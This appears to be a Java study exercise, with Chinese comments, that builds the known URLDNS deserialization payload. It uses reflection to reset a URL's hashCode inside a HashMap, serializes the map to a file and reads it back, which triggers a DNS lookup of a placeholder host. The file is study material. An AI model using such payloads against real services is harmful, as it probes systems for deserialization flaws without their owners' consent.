package com.study;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class urldns {

    public static void main(String[] args) throws Exception{

        HashMap<URL, String> hashMap = new HashMap<URL, String>();  // 创建HashMap，并在 key 处设置 URL 类
        URL url = new URL("http://xxxx");   //创建 URL 类
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");  //获取 URL 类的 hashCode 变量
        f.setAccessible(true); //设置权限
        //f.set(url, -122); //HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode
        hashMap.put(url, "1"); //放入 HashMap
        f.set(url, -1);  //设置 HashCode 为-1，之前的分析，如果HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("tmp.cer"));
        oos.writeObject(hashMap); //序列化写入文件

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("tmp.cer"));
        ois.readObject();
    }



}
